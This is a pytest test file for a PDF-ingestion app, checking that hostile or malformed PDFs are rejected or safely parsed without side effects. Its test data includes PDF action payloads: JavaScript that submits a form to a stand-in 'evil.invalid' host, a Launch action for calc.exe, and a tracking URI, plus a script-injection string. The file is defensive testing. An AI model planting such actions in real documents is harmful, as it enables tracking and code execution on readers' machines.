"""Hostile and unusual PDFs (Phase 16).

One bad source must never take the app down: it is either rejected at
upload, or marked failed with a message, while other sources keep working.
Document JavaScript, launch actions and links are never executed or followed
(PyMuPDF only parses and renders; LiteNotebook never calls any action API).
"""

from __future__ import annotations

import socket
import subprocess
import threading
from pathlib import Path

import pymupdf
import pytest

from conftest import make_pdf
from litenotebook.ingest.pdf import PdfError, extract_pages, inspect_pdf
from litenotebook.ingest.pdflock import PDF_LOCK
from litenotebook.ingest.pipeline import (
    IngestError,
    UnsupportedFileError,
    process_source,
    register_source,
)
from litenotebook.reader.geometry import page_geometry
from litenotebook.reader.render import MAX_PIXELS_SIDE, open_source, render_page
from litenotebook.sources import get_source
from litenotebook.unified_search import search_sources_lexical


def _png_size(data: bytes) -> tuple[int, int]:
    import struct

    assert data[:8] == b"\x89PNG\r\n\x1a\n"
    w, h = struct.unpack(">II", data[16:24])
    return int(w), int(h)


def _with_action(path: Path, action: str) -> Path:
    doc = pymupdf.open()
    doc.new_page().insert_text((72, 72), "Quarterly harbour report")
    xref = doc.get_new_xref()
    doc.update_object(xref, action)
    doc.xref_set_key(doc.pdf_catalog(), "OpenAction", f"{xref} 0 R")
    doc.save(path)
    doc.close()
    return path


@pytest.fixture
def no_side_effects(monkeypatch):  # type: ignore[no-untyped-def]
    """Fail the test if anything starts a process or opens a network socket."""
    calls: list[str] = []

    def popen(*a, **k):  # type: ignore[no-untyped-def]
        calls.append(f"process {a[:1]}")
        raise AssertionError("a process was started")

    real_connect = socket.socket.connect

    def connect(self, address):  # type: ignore[no-untyped-def]
        if self.family in (socket.AF_INET, socket.AF_INET6):
            calls.append(f"connect {address}")
            raise AssertionError("a network connection was attempted")
        return real_connect(self, address)

    monkeypatch.setattr(subprocess, "Popen", popen)
    monkeypatch.setattr(socket.socket, "connect", connect)
    return calls


@pytest.mark.parametrize(
    "action",
    [
        "<< /Type /Action /S /JavaScript /JS (app.alert\\('pwned'\\); "
        "this.submitForm\\('https://evil.invalid/'\\)) >>",
        "<< /Type /Action /S /Launch /F (C:\\\\Windows\\\\System32\\\\calc.exe) >>",
        "<< /Type /Action /S /URI /URI (https://evil.invalid/track) >>",
        "<< /Type /Action /S /SubmitForm "
        "/F << /FS /URL /F (https://evil.invalid/) >> >>",
    ],
    ids=["javascript", "launch", "uri", "submitform"],
)
def test_document_actions_are_never_executed(
    conn, settings, notebook, embedder, store, tmp_path, no_side_effects, action
):
    pdf = _with_action(tmp_path / "actions.pdf", action)
    src = register_source(conn, settings, notebook, pdf)
    process_source(conn, settings, src.id, embedder, store)
    assert get_source(conn, notebook.id, src.id).status == "ready"
    reader = open_source(conn, settings, notebook.id, src.id)
    path, _ = render_page(settings, reader, 1, 1.0)
    assert _png_size(path.read_bytes())[0] > 100
    assert [w.text for w in page_geometry(reader.path, 1).words][:2] == [
        "Quarterly",
        "harbour",
    ]
    assert no_side_effects == []


def test_password_protected_pdf_is_rejected_with_a_clear_message(
    conn, settings, notebook, tmp_path
):
    doc = pymupdf.open()
    doc.new_page().insert_text((72, 72), "secret")
    path = tmp_path / "locked.pdf"
    doc.save(
        path,
        encryption=pymupdf.PDF_ENCRYPT_AES_256,
        user_pw="user",
        owner_pw="owner",
    )
    doc.close()
    with pytest.raises((UnsupportedFileError, IngestError, PdfError), match="password"):
        register_source(conn, settings, notebook, path)
    assert conn.execute("SELECT count(*) FROM sources").fetchone()[0] == 0


def test_truncated_pdf_is_repaired_or_rejected_never_crashes(
    conn, settings, notebook, embedder, store, tmp_path
):
    full = make_pdf(tmp_path / "full.pdf", ["Velt river", "Orrin mountains", "Glacier"])
    raw = full.read_bytes()
    for cut in (len(raw) // 2, len(raw) - 40, 200):
        path = tmp_path / f"cut-{cut}.pdf"
        path.write_bytes(raw[:cut])
        try:
            src = register_source(conn, settings, notebook, path)
        except (UnsupportedFileError, IngestError, PdfError) as e:
            assert "damaged" in str(e) or "not a" in str(e) or "no pages" in str(e)
            continue
        process_source(conn, settings, src.id, embedder, store)
        state = get_source(conn, notebook.id, src.id)
        assert state.status in ("ready", "failed")
        if state.status == "failed":
            assert state.error


def test_huge_page_dimensions_render_within_the_pixel_cap(
    conn, settings, notebook, embedder, store, tmp_path
):
    doc = pymupdf.open()
    doc.new_page(width=14400, height=14400).insert_text((72, 72), "Huge poster page")
    path = tmp_path / "huge.pdf"
    doc.save(path)
    doc.close()
    src = register_source(conn, settings, notebook, path)
    process_source(conn, settings, src.id, embedder, store)
    reader = open_source(conn, settings, notebook.id, src.id)
    out, _ = render_page(settings, reader, 1, 2.0)
    w, h = _png_size(out.read_bytes())
    assert max(w, h) <= MAX_PIXELS_SIDE


def test_unusual_unicode_is_stored_searchable_and_escaped(
    conn, settings, notebook, embedder, store, tmp_path
):
    text = (
        "Ångström café naïve. Straße ÆØÅ. 東京 harbour. Ελληνικά. "
        "Zero\u200bwidth and soft\u00adhyphen. <script>alert(1)</script>"
    )
    path = make_pdf(tmp_path / "unicode.pdf", [text])
    src = register_source(conn, settings, notebook, path)
    process_source(conn, settings, src.id, embedder, store)
    assert get_source(conn, notebook.id, src.id).status == "ready"
    stored = "".join(r[0] for r in conn.execute("SELECT text FROM chunks"))
    assert "Ångström" in stored and "Straße" in stored
    hits = search_sources_lexical(conn, notebook.id, "Ångström", 5)
    assert hits


def test_many_pages_ingest_in_bounded_steps(
    conn, settings, notebook, embedder, store, tmp_path
):
    doc = pymupdf.open()
    for i in range(600):
        doc.new_page().insert_text(
            (72, 72), f"Page {i} of the long ledger, entry {i * 7}."
        )
    path = tmp_path / "many.pdf"
    doc.save(path)
    doc.close()
    assert inspect_pdf(path) == 600
    src = register_source(conn, settings, notebook, path)
    report = process_source(conn, settings, src.id, embedder, store)
    assert get_source(conn, notebook.id, src.id).status == "ready"
    assert report.pages == 600


@pytest.mark.parametrize(
    "payload",
    [
        b"%PDF-1.7\nthis is not really a pdf\n",
        b"%PDF-1.4\n" + b"\x00" * 4096,
        b"<html><body>%PDF-1.4 not a pdf</body></html>",
        b"PK\x03\x04%PDF-1.4 zip pretending",
    ],
)
def test_files_claiming_to_be_pdf_are_rejected(
    conn, settings, notebook, tmp_path, payload
):
    path = tmp_path / "invoice.pdf"
    path.write_bytes(payload)
    with pytest.raises((UnsupportedFileError, IngestError, PdfError)):
        register_source(conn, settings, notebook, path)
    assert conn.execute("SELECT count(*) FROM sources").fetchone()[0] == 0
    assert (
        not list(settings.notebooks_dir.rglob("*.pdf"))
        if settings.notebooks_dir.exists()
        else True
    )


def test_one_bad_source_does_not_affect_others(
    conn, settings, notebook, embedder, store, tmp_path, monkeypatch
):
    good = register_source(
        conn, settings, notebook, make_pdf(tmp_path / "good.pdf", ["Velt river rises."])
    )
    bad = register_source(
        conn, settings, notebook, make_pdf(tmp_path / "bad.pdf", ["Broken later."])
    )
    process_source(conn, settings, good.id, embedder, store)
    # the stored file is damaged after upload (disk error, external edit)
    stored = settings.source_file(notebook.id, bad.id)
    stored.write_bytes(b"%PDF-1.4\ngarbage")
    with pytest.raises(IngestError, match="damaged"):
        process_source(conn, settings, bad.id, embedder, store)
    assert get_source(conn, notebook.id, bad.id).status == "failed"
    assert get_source(conn, notebook.id, good.id).status == "ready"
    assert search_sources_lexical(conn, notebook.id, "Velt", 5)


def test_pymupdf_is_never_called_concurrently(tmp_path, monkeypatch):
    """PyMuPDF is not thread-safe: Reader renders and ingestion share a lock."""
    path = make_pdf(tmp_path / "x.pdf", [f"page {i} text body" for i in range(12)])
    active = 0
    worst = 0
    guard = threading.Lock()
    real_get_text = pymupdf.Page.get_text

    def tracked(self, *a, **k):  # type: ignore[no-untyped-def]
        nonlocal active, worst
        with guard:
            active += 1
            worst = max(worst, active)
        try:
            assert PDF_LOCK._is_owned()  # type: ignore[attr-defined]
            return real_get_text(self, *a, **k)
        finally:
            with guard:
                active -= 1

    monkeypatch.setattr(pymupdf.Page, "get_text", tracked)
    errors: list[BaseException] = []

    def work(fn) -> None:  # type: ignore[no-untyped-def]
        try:
            for _ in range(5):
                fn()
        except BaseException as e:  # pragma: no cover - reported below
            errors.append(e)

    threads = [
        threading.Thread(target=work, args=(lambda: extract_pages(path),)),
        threading.Thread(target=work, args=(lambda: page_geometry(path, 3),)),
        threading.Thread(target=work, args=(lambda: page_geometry(path, 7),)),
    ]
    for t in threads:
        t.start()
    for t in threads:
        t.join()
    assert errors == []
    assert worst == 1
